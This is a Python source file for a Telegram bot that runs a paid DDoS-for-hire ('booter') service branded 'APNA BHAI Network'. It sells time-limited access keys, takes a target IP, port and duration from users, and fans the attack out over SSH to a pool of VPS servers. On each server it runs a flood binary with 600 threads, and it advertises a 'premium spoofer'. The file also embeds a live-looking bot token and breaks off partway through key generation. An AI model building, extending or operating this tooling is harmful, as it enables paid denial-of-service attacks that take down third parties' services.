import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from typing import Dict, List, Optional, Tuple  # Added Tuple
import sys
import os
import paramiko
from stat import S_ISDIR
import subprocess

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Constants
KEY_PRICES = {
    'hour': 10,  # 10 Rs per hour
    'day': 80,   # 80 Rs per day
    'week': 300  # 300 Rs per week
}
ADMIN_IDS = [6882674372]  # Replace with actual admin IDs
BOT_TOKEN = "7157157861:AAF5uykhEt6wl3Z4EUjKtiMbseXxkohaoeo"  # Replace with your bot token
thread_count = 600
GROUP_MAX_ATTACK_TIME = 60  # 1 minute for group users
USER_MAX_ATTACK_TIME = 120 
ACTIVE_BOTS_FILE = 'active_bots.json'
ADMIN_FILE = 'admin_data.json'
VPS_FILE = 'vps_data.json'
APPROVED_GROUPS_FILE = 'approved_groups.json'
REQUIRED_CHANNELS_FILE = 'required_channels.json'
FEEDBACK_CHANNEL = None
OWNER_FILE = 'owner_data.json'
PENDING_USERS_FILE = 'pending_users.json'  # Added missing constant
last_attack_times = {}
COOLDOWN_MINUTES = 0
CLAIM_SETTINGS_FILE = 'claim_settings.json'
DEFAULT_CLAIM_AMOUNT = 3600  # 1 hour in seconds
DEFAULT_CLAIM_COOLDOWN = 86400
OWNER_IDS = ADMIN_IDS.copy()  # Start with super admins as owners
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# File paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.json')  # Changed from .txt to .json for consistency
KEYS_FILE = os.path.join(BASE_DIR, 'keys.json')  # Changed from key.txt to keys.json for consistency

# Global variables
keys = {}
redeemed_keys = set()
loop = None
BOT_START_TIME = time.time()
ATTACK_SPAM_LIMIT = 5  # Max allowed attacks in SPAM_TIME_WINDOW
SPAM_TIME_WINDOW = 60  # 60 seconds window for spam detection
BAN_DURATION = 1200  # 20 minutes in seconds
attack_attempts = {}  # Track attack attempts: {user_id: [timestamps]}
banned_users = {} 

# Helper functions

def load_approved_groups():
    try:
        if os.path.exists(APPROVED_GROUPS_FILE):
            with open(APPROVED_GROUPS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading approved groups: {e}")
    return {'groups': []}

def save_approved_groups(data):
    try:
        with open(APPROVED_GROUPS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving approved groups: {e}")
        return False

def load_required_channels():
    try:
        if os.path.exists(REQUIRED_CHANNELS_FILE):
            with open(REQUIRED_CHANNELS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading required channels: {e}")
    return {'channels': []}

def save_required_channels(data):
    try:
        with open(REQUIRED_CHANNELS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving required channels: {e}")
        return False

def is_user_banned(user_id):
    """Check if user is currently banned."""
    if user_id in banned_users:
        if time.time() < banned_users[user_id]:
            return True
        else:
            # Ban expired, remove it
            del banned_users[user_id]
    return False

# Add this helper function to ban a user
def ban_user(user_id):
    """Ban a user for BAN_DURATION seconds."""
    banned_users[user_id] = time.time() + BAN_DURATION
    logger.warning(f"User {user_id} banned for spamming attacks")

# Add this function to clean up old attack attempts periodically
def clean_old_attempts():
    """Remove old attack attempts to prevent memory issues."""
    current_time = time.time()
    for user_id in list(attack_attempts.keys()):
        # Keep only attempts from the last SPAM_TIME_WINDOW seconds
        attack_attempts[user_id] = [
            t for t in attack_attempts[user_id]
            if current_time - t <= SPAM_TIME_WINDOW
        ]
        if not attack_attempts[user_id]:
            del attack_attempts[user_id]


def load_claim_settings():
    try:
        if os.path.exists(CLAIM_SETTINGS_FILE):
            with open(CLAIM_SETTINGS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading claim settings: {e}")
    return {
        'enabled': True,
        'amount': DEFAULT_CLAIM_AMOUNT,
        'cooldown': DEFAULT_CLAIM_COOLDOWN,
        'last_claims': {}
    }

def save_claim_settings(settings):
    try:
        with open(CLAIM_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f)
        return True
    except Exception as e:
        logger.error(f"Error saving claim settings: {e}")
        return False

def load_active_bots():
    try:
        if os.path.exists(ACTIVE_BOTS_FILE):
            with open(ACTIVE_BOTS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading active bots: {e}")
    return {'bots': []}

def save_active_bots(data):
    try:
        with open(ACTIVE_BOTS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving active bots: {e}")
        return False
    
def load_pending_users():
    try:
        if os.path.exists(PENDING_USERS_FILE):
            with open(PENDING_USERS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading pending users: {e}")
    return {'users': []}

def save_pending_users(data):
    try:
        with open(PENDING_USERS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving pending users: {e}")
        return False
    
def load_users() -> List[Dict]:
    """Load users from file."""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading users: {e}")
    return []

def save_users(users: List[Dict]) -> bool:
    """Save users to file."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f)
        return True
    except Exception as e:
        logger.error(f"Error saving users: {e}")
        return False

def load_keys() -> Dict:
    """Load keys from file."""
    try:
        if os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading keys: {e}")
    return {}

def save_keys(keys: Dict) -> bool:
    """Save keys to file."""
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump(keys, f)
        return True
    except Exception as e:
        logger.error(f"Error saving keys: {e}")
        return False

def load_admin_data() -> Dict:
    """Load admin data from file."""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
    return {'admins': {}}

def save_admin_data(data: Dict) -> bool:
    """Save admin data to file."""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False

def load_vps_data() -> Dict:
    """Load VPS data from file."""
    try:
        if os.path.exists(VPS_FILE):
            with open(VPS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading VPS data: {e}")
    return {'vps': {}}

def save_vps_data(data: Dict) -> bool:
    """Save VPS data to file."""
    try:
        with open(VPS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving VPS data: {e}")
        return False

def load_owner_data() -> Dict:
    """Load owner data from file."""
    try:
        if os.path.exists(OWNER_FILE):
            with open(OWNER_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading owner data: {e}")
    return {'owners': OWNER_IDS.copy()}

def save_owner_data(data: Dict) -> bool:
    """Save owner data to file."""
    try:
        with open(OWNER_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving owner data: {e}")
        return False

def generate_key(length: int = 16) -> str:
    """Generate a random key."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def calculate_key_price(amount: int, time_unit: str) -> int:
    """Calculate the price for a key."""
    if time_unit not in KEY_PRICES:
        return 0
    return amount * KEY_PRICES[time_unit]

def get_admin_balance(user_id: int) -> float:
    """Get admin balance."""
    if is_super_admin(user_id):
        return float('inf')
    
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def update_admin_balance(user_id: str, amount: float) -> bool:
    """Update admin balance."""
    if is_super_admin(int(user_id)):
        return True
    
    admin_data = load_admin_data()
    if user_id not in admin_data['admins']:
        return False
    
    current_balance = admin_data['admins'][user_id]['balance']
    if current_balance < amount:
        return False
    
    admin_data['admins'][user_id]['balance'] -= amount
    return save_admin_data(admin_data)

def is_admin(user_id: int) -> bool:
    """Check if user is admin."""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or is_super_admin(user_id)

def is_super_admin(user_id: int) -> bool:
    """Check if user is super admin."""
    return user_id in ADMIN_IDS

def is_owner(user_id: int) -> bool:
    """Check if user is owner."""
    owner_data = load_owner_data()
    return user_id in owner_data['owners']

def check_cooldown(user_id: int) -> Tuple[bool, int]:
    """Check if user is in cooldown.
    Returns:
        Tuple[bool, int]: (is_in_cooldown, remaining_seconds)
    """
    current_time = time.time()
    last_attack_time = last_attack_times.get(user_id, 0)
    cooldown_seconds = COOLDOWN_MINUTES * 60
    
    if current_time - last_attack_time < cooldown_seconds:
        remaining = cooldown_seconds - (current_time - last_attack_time)
        return True, remaining
    return False, 0

def ssh_execute(ip: str, username: str, password: str, command: str) -> Tuple[bool, str]:
    """Execute SSH command on remote server.
    Returns:
        Tuple[bool, str]: (success_status, output_message)
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        
        return True, output
    except Exception as e:
        return False, str(e)

def ssh_upload_file(ip: str, username: str, password: str, local_path: str, remote_path: str) -> Tuple[bool, str]:
    """Upload file to remote server via SFTP.
    Returns:
        Tuple[bool, str]: (success_status, output_message)
    """
    try:
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, remote_path)
        sftp.close()
        transport.close()
        
        return True, "File uploaded successfully"
    except Exception as e:
        return False, str(e)

def ssh_remove_file(ip: str, username: str, password: str, remote_path: str) -> Tuple[bool, str]:
    """Remove file from remote server.
    Returns:
        Tuple[bool, str]: (success_status, output_message)
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(f"rm -f {remote_path}")
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        
        if "No such file" in output:
            return False, "File not found"
        return True, "File removed successfully"
    except Exception as e:
        return False, str(e)

def ssh_list_files(ip: str, username: str, password: str, remote_path: str) -> Tuple[bool, List[str]]:
    """List files in remote directory.
    Returns:
        Tuple[bool, List[str]]: (success_status, list_of_files_or_error)
    """
    try:
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        files = sftp.listdir(remote_path)
        sftp.close()
        transport.close()
        
        return True, files
    except Exception as e:
        return False, [str(e)]

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Step 1: Add Feedback Button to the main markup
def get_main_markup(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("⚡ Attack"),
        KeyboardButton("🔑 Redeem Key"),
        KeyboardButton("👤 My Account🫰"),
        KeyboardButton("📜 Rules"),
        KeyboardButton("🆙 Uptime"),  # New button added here
        KeyboardButton("🆓 Claim"),
        KeyboardButton("📩 Feedback")
    ]
    
    if is_admin(user_id):
        buttons.append(KeyboardButton("👤 User Management"))
    if is_super_admin(user_id):
        buttons.append(KeyboardButton("🛠️ Admin Tools"))
    if is_owner(user_id):
        buttons.append(KeyboardButton("🖥️ VPS Management"))
    
    markup.add(*buttons)
    return markup

def get_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🔑 Generate Key"),
        KeyboardButton("🗑️ Remove User"),
        KeyboardButton("📊 Check Balance"),
        KeyboardButton("⬅️ Main Menu"),
        KeyboardButton("⏱ Set Key Time"),
        KeyboardButton("👤 Approve Users"),
        KeyboardButton("⏱ Claim Settings"),
        KeyboardButton("👥 Group Management")  # New button
    ]
    markup.add(*buttons)
    return markup


def get_super_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Admin"),
        KeyboardButton("➖ Remove Admin"),
        KeyboardButton("📋 List Users"),
        KeyboardButton("⚙️ Set Threads"),
        KeyboardButton("⏱ Set Max Time"),  # Changed to menu
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_vps_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add VPS"),
        KeyboardButton("🗑️ Remove VPS"),
        KeyboardButton("📋 List VPS"),
        KeyboardButton("📁 VPS Files"),
        KeyboardButton("👑 Owner Tools"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_vps_files_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("📤 Upload to All"),
        KeyboardButton("🗑️ Remove from All"),
        KeyboardButton("📂 List Files"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_owner_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Owner"),
        KeyboardButton("🤖 Bot Management"),
        KeyboardButton("📢 Set Feedback Channel"),  # New button
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"

    # Check if user is admin or already approved
    if not is_admin(user_id) and not any(u['user_id'] == user_id for u in load_users()):
        pending = load_pending_users()
        if str(user_id) not in pending['users']:
            pending['users'].append(str(user_id))
            save_pending_users(pending)
            bot.send_message(message.chat.id, "Your request has been sent to admins for approval!")
            return

    # Styled welcome message
    styled_text = """
🔮 <b>𝓦𝓮𝓵𝓬𝓸𝓶𝓮 𝓽𝓸 𝓐𝓟𝓝𝓐 𝓑𝓗𝓐𝓘 𝓝𝓮𝓽𝓦𝓸𝓻𝓴</b> 🔮

✨ <i>ᴛʜᴇ ᴍᴏꜱᴛ ᴘᴏᴡᴇʀꜰᴜʟ ᴅᴅᴏꜱ ᴘʟᴀᴛꜰᴏʀᴍ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ</i> ✨

╔══════════════════════╗
  ☄️ <b>ꜰᴇᴀᴛᴜʀᴇꜱ</b> ☄️
╚══════════════════════╝

• 🚀 <b>ᴜʟᴛʀᴀ-ꜰᴀꜱᴛ ᴀᴛᴛᴀᴄᴋꜱ</b>
• 🔐 <b>ᴠɪᴘ ᴋᴇʏ ꜱʏꜱᴛᴇᴍ</b>
• 👑 <b>ᴍᴜʟᴛɪ-ᴠᴘꜱ ꜱᴜᴘᴘᴏʀᴛ</b>
• ⚡ <b>ᴘʀᴇᴍɪᴜᴍ ꜱᴘᴏᴏꜰᴇʀ</b>

╔══════════════════════╗
  💎 <b>ᴘʀᴇᴍɪᴜᴍ ᴇxᴘᴇʀɪᴇɴᴄᴇ</b> 💎
╚══════════════════════╝

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗔𝗣𝗡𝗔 𝗕𝗛𝗔𝗜 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 ༻꧂</b>
<b>᚛ ᚛ 𝗢𝘄𝗻𝗲𝗿 𝗜𝗗: @LASTWISHES0, @LostBoiXD ᚜ ᚜</b>
    """

    # Send welcome video with styled caption
    try:
        with open('welcome.mp4', 'rb') as video:
            bot.send_video(
                message.chat.id,
                video,
                caption=styled_text,
                parse_mode='HTML',
                reply_markup=get_main_markup(user_id)
            )
    except Exception as e:
        logger.error(f"Error sending welcome video: {e}")
        bot.send_message(
            message.chat.id,
            styled_text,
            parse_mode='HTML',
            reply_markup=get_main_markup(user_id)
        )


@bot.message_handler(func=lambda message: message.text == "⬅️ Main Menu")
def return_to_main_menu(message):
    user_id = message.from_user.id
    bot.send_message(
        message.chat.id,
        "🔰 *Main Menu* 🔰",
        parse_mode='Markdown',
        reply_markup=get_main_markup(user_id)
    )

@bot.message_handler(func=lambda message: message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
def my_account(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if is_admin(user_id):
        bot.send_message(chat_id, "*You are an admin!*", parse_mode='Markdown')
        return
    
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    
    if not user:
        bot.send_message(chat_id, "*You don't have an active account. Please redeem a key.*", parse_mode='Markdown')
        return
    
    valid_until = datetime.fromisoformat(user['valid_until'])
    remaining = valid_until - datetime.now()
    
    if remaining.total_seconds() <= 0:
        bot.send_message(chat_id, "*Your key has expired. Please redeem a new key.*", parse_mode='Markdown')
    else:
        hours, remainder = divmod(remaining.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        bot.send_message(
            chat_id,
            f"*Account Information*\n\n"
            f"User ID: `{user_id}`\n"
            f"Expires in: `{int(hours)}h {int(minutes)}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "⚡ Attack")
def attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Check if in group and group is approved
    if message.chat.type in ['group', 'supergroup']:
        approved_groups = load_approved_groups()
        if str(chat_id) not in approved_groups['groups']:
            bot.send_message(chat_id, "*This group is not approved for attacks!*", parse_mode='Markdown')
            return
    
    # Check required channels
    required_channels = load_required_channels()
    if required_channels['channels']:
        not_joined = []
        for channel in required_channels['channels']:
            try:
                chat_member = bot.get_chat_member(channel, user_id)
                if chat_member.status in ['left', 'kicked']:
                    not_joined.append(channel)
            except Exception as e:
                logger.error(f"Error checking channel membership: {e}")
                not_joined.append(channel)
        
        if not_joined:
            channels_text = "\n".join(f"👉 {channel}" for channel in not_joined)
            bot.send_message(
                chat_id,
                f"*⚠️ You must join these channels first:*\n\n{channels_text}\n\n"
                f"After joining, try the attack command again.",
                parse_mode='Markdown'
            )
            return
    
    # Check if user is banned
    if is_user_banned(user_id):
        remaining_time = int(banned_users[user_id] - time.time())
        minutes = remaining_time // 60
        seconds = remaining_time % 60
        bot.send_message(
            chat_id,
            f"🚫 *You are banned for spamming!*\n\n"
            f"Please wait {minutes}m {seconds}s before attacking again.",
            parse_mode='Markdown'
        )
        return
    
    # Track attack attempt
    current_time = time.time()
    if user_id not in attack_attempts:
        attack_attempts[user_id] = []
    
    attack_attempts[user_id].append(current_time)
    
    # Clean old attempts first
    clean_old_attempts()
    
    # Check if user has exceeded spam limit
    if len(attack_attempts[user_id]) > ATTACK_SPAM_LIMIT:
        ban_user(user_id)
        bot.send_message(
            chat_id,
            "🚫 *You have been banned for 20 minutes for spamming attack commands!*\n\n"
            "Please wait before trying again.",
            parse_mode='Markdown'
        )
        return
    
    # Check cooldown
    on_cooldown, remaining = check_cooldown(user_id)
    if on_cooldown:
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        bot.send_message(
            chat_id,
            f"*You're on cooldown! Please wait {minutes}m {seconds}s before attacking again.*",
            parse_mode='Markdown'
        )
        return
    
    # Authorization check
    if not is_admin(user_id):
        users = load_users()
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            bot.send_message(chat_id, "*You are not registered. Please redeem a key.*", parse_mode='Markdown')
            return
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            bot.send_message(chat_id, "*Your key has expired. Please redeem a new key.*", parse_mode='Markdown')
            return
    
    # Send attack prompt
    attack_videos = ['apnabhai1.mp4', 'apnabhai2.mp4', 'apnabhai3.mp4', 'apnabhai4.mp4', 'apnabhai5.mp4']
    selected_video = random.choice(attack_videos)
    
    try:
        with open(selected_video, 'rb') as video:
            bot.send_video(
                chat_id,
                video,
                caption="*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
    except Exception as e:
        logger.error(f"Error sending attack video: {e}")
        bot.send_message(
            chat_id,
            "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardRemove()
        )

def process_attack_command(message, chat_id):
    """Process attack command from user."""
    user_id = message.from_user.id
    command = message.text.strip()
    
    # Authorization check
    if not is_admin(user_id):
        users = load_users()
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            bot.send_message(chat_id, "*You are not registered. Please redeem a key.*", parse_mode='Markdown')
            return
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            bot.send_message(chat_id, "*Your key has expired. Please redeem a new key.*", parse_mode='Markdown')
            return
    
    # Parse command
    try:
        parts = command.split()
        if len(parts) < 3:
            bot.send_message(chat_id, "*Invalid format. Use: <IP> <PORT> <TIME> [METHOD]*", parse_mode='Markdown')
            return
            
        ip = parts[0]
        port = int(parts[1])
        attack_time = int(parts[2])
        method = parts[3] if len(parts) > 3 else "DEFAULT"
        
        # Validate port
        if port in blocked_ports:
            bot.send_message(chat_id, "*This port is blocked for attacks.*", parse_mode='Markdown')
            return
            
        # Validate time
        if message.chat.type in ['group', 'supergroup']:
            max_time = GROUP_MAX_ATTACK_TIME
        else:
            max_time = USER_MAX_ATTACK_TIME
            
        # Admins get double the max time
        if is_admin(user_id):
            max_time *= 2
            
        if attack_time > max_time:
            bot.send_message(
                chat_id, 
                f"*Maximum attack time is {max_time} seconds for {'groups' if message.chat.type in ['group', 'supergroup'] else 'direct users'}.*", 
                parse_mode='Markdown'
            )
            return
        
        # Get all VPS
        vps_data = load_vps_data()
        if not vps_data['vps']:
            bot.send_message(chat_id, "*No VPS available!*", parse_mode='Markdown')
            return
        
        # Start attack message
        start_msg = bot.send_message( 
            chat_id,
            f"╔════════════════════════════╗\n"
            f"║    🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!    ║\n"
            f"╚════════════════════════════╝\n\n"
            f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁 ➜ `{ip}:{port}`\n"
            f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ➜ `{attack_time} seconds`\n"
            f"📡 𝗠𝗲𝘁𝗵𝗼𝗱 ➜ `{method}`\n"
            f"🌀 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 ➜ `{thread_count}`\n"
            f"🌐 𝗩𝗣𝗦 𝗖𝗼𝘂𝗻𝘁 ➜ `{len(vps_data['vps'])}`\n\n"
            f"⚡ 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝘼𝙏𝙏𝘼𝘾𝙆𝙄𝙉𝙂 𝙉𝙊𝙒...\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗔𝗣𝗡𝗔 𝗕𝗛𝗔𝗜 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 ༻꧂\n"
            f"᚛ ᚛ 𝗗𝗲𝘃: @LostBoiXD @LASTWISHES0 ᚜ ᚜",
            parse_mode='Markdown')
        
        # Execute attacks on all VPS
        success_count = 0
        failed_count = 0
        threads = []
        
        def attack_vps(vps_ip, vps_details):
            nonlocal success_count, failed_count
            try:
                command = f"./smokey {ip} {port} {attack_time} {thread_count} {method}"
                success, output = ssh_execute(
                    vps_ip,
                    vps_details['username'],
                    vps_details['password'],
                    command
                )
                if success:
                    success_count += 1
                else:
                    failed_count += 1
                    logger.error(f"Attack failed on {vps_ip}: {output}")
            except Exception as e:
                failed_count += 1
                logger.error(f"Attack failed on {vps_ip}: {str(e)}")
        
        # Create threads for each VPS
        for vps_ip, vps_details in vps_data['vps'].items():
            t = Thread(target=attack_vps, args=(vps_ip, vps_details))
            threads.append(t)
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Update cooldown
        last_attack_times[user_id] = time.time()
        
        # Edit message with results
        bot.edit_message_text(
            f"╔════════════════════════════╗\n"
            f"║    ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!    ║\n"
            f"╚════════════════════════════╝\n\n"
            f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁 ➜ `{ip}:{port}`\n"
            f"⏱️ 𝗧𝗶𝗺𝗲 𝗦𝗽𝗲𝗻𝘁 ➜ `{attack_time} seconds`\n"
            f"📡 𝗠𝗲𝘁𝗵𝗼𝗱 ➜ `{method}`\n"
            f"🌐 𝗩𝗣𝗦 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ➜ `{success_count}`\n"
            f"🔥 𝗧𝗼𝘁𝗮𝗹 𝗙𝗶𝗿𝗲𝗽𝗼𝘄𝗲𝗿 ➜ `{success_count * thread_count}` threads\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"꧁༺ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗨𝗦𝗜𝗡𝗚 𝗔𝗣𝗡𝗔 𝗕𝗛𝗔𝗜 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 ༻꧂",
            chat_id=chat_id,
            message_id=start_msg.message_id,
            parse_mode='Markdown')
            
    except ValueError:
        bot.send_message(chat_id, "*Invalid input. Use numbers for port and time.*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your attack.*", parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "📜 Rules")
def show_rules(message):
    rules_text = """
🔰 *APNA BHAI NETWORK RULES* 🔰

╔══════════════════════════╗
║       📜 𝗥𝗨𝗟𝗘𝗦         ║
╚══════════════════════════╝

1️⃣ *NO SPAMMING*  
   - Do not spam attack commands or bot will automatically ban you
   - Respect the cooldown periods between attacks

2️⃣ *LEGAL USE ONLY*  
   - Only attack targets you have permission to test
   - Do not attack government or critical infrastructure

3️⃣ *RESPECT ADMINS*  
   - Follow instructions from admins and moderators
   - Report issues politely

4️⃣ *NO KEY SHARING*  
   - Each key is for one user only
   - Sharing keys will result in permanent ban

5️⃣ *FAIR USAGE*  
   - Don't abuse the system with excessive attacks
   - Allow others to use the service too

╔══════════════════════════╗
║    ⚠️ 𝗖𝗢𝗡𝗦𝗘𝗤𝗨𝗘𝗡𝗖𝗘𝗦     ║
╚══════════════════════════╝

- First violation: Warning
- Second violation: Temporary ban (7 days)
- Third violation: Permanent ban

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
By using this bot, you agree to these rules.
"""

    bot.send_message(
        message.chat.id,
        rules_text,
        parse_mode='Markdown',
        reply_markup=get_main_markup(message.from_user.id)
    )

@bot.message_handler(func=lambda message: message.text == "🔑 Generate Key" and is_admin(message.from_user.id))
def generate_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to generate keys.*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    row1 = [KeyboardButton("⏳ 1 Hour"), KeyboardButton("📅 1 Day")]
    row2 = [KeyboardButton("📆 1 Week"), KeyboardButton("⬅️ Main Menu")]
    markup.row(*row1)
    markup.row(*row2)
    
    bot.send_message(
        chat_id,
        "*Select key type:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

# Modify the key generation flow
@bot.message_handler(func=lambda message: message.text in ["⏳ 1 Hour", "📅 1 Day", "📆 1 Week"] and is_admin(message.from_user.id))
def process_key_generation(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Admin"
    
    time_unit_map = {
        "⏳ 1 Hour": "hour",
        "📅 1 Day": "day",
        "📆 1 Week": "week"
    }
    
    time_unit = time_unit_map.get(message.text)
    if not time_unit:
        bot.send_message(chat_id, "*Invalid selection.*", parse_mode='Markdown')
        return
    
    msg = bot.send_message(
        chat_id,
        "*Enter maximum attack time (in seconds) for this key:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, lambda m: finish_key_generation(m, time_unit, username))

def finish_key_generation(message, time_unit, username):
    chat_id = message.chat.id
    try:
        max_time = int(message.text.strip())
        if max_time < 60 or max_time > 86400:
            raise ValueError
    except:
        bot.send_message(chat_id, "*Invalid time! Use between 60-86400 seconds.*", parse_mode='Markdown')
        return
    
    key = "APNA-BHAI-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
    
    keys = load_keys()
    keys[key] = {
        'duration': time_unit,
        'max_time': max_time,
        'generated_by': message.from_user.id,
        'generated_by_username': username,
        'generated_at': datetime.now().isoformat(),
